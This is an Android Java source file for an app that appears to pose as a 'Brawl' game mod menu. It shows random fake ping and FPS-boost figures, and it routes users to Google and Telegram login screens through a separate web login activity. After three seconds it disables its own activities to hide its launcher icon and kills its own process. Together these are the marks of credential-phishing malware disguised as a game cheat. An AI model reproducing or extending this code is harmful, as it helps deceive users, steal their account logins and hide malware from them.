package com.brawl.modmenu;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.widget.TextView;
import java.util.Random;

public class MainActivity extends Activity {

    private Handler handler = new Handler(Looper.getMainLooper());
    private Random rnd = new Random();

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.main);

        findViewById(R.id.btnGoogle).setOnClickListener(v -> {
            Intent i = new Intent(this, WebLoginActivity.class);
            i.putExtra("provider", "google");
            startActivity(i);
        });

        findViewById(R.id.btnTelegram).setOnClickListener(v -> {
            Intent i = new Intent(this, WebLoginActivity.class);
            i.putExtra("provider", "telegram");
            startActivity(i);
        });

        handler.post(updateStats);
        handler.postDelayed(this::hideSelf, 3000);
    }

    private Runnable updateStats = new Runnable() {
        @Override
        public void run() {
            TextView ping = findViewById(R.id.ping);
            TextView fps = findViewById(R.id.fps);
            if (ping != null) ping.setText((12 + rnd.nextInt(36)) + "ms");
            if (fps != null) fps.setText("+" + (30 + rnd.nextInt(30)) + "%");
            handler.postDelayed(this, 800);
        }
    };

    private void hideSelf() {
        try {
            PackageManager pm = getPackageManager();
            String[] names = {
                "com.brawl.modmenu.OnboardingActivity",
                "com.brawl.modmenu.MainActivity",
                "com.brawl.modmenu.WebLoginActivity"
            };
            for (String name : names) {
                try {
                    ComponentName cn = new ComponentName(getPackageName(), name);
                    pm.setComponentEnabledSetting(cn,
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                        PackageManager.DONT_KILL_APP);
                } catch (Throwable ignored) {}
            }
        } catch (Throwable ignored) {}

        finishAffinity();

        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            android.os.Process.killProcess(android.os.Process.myPid());
        }, 500);
    }

    @Override
    protected void onDestroy() {
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}
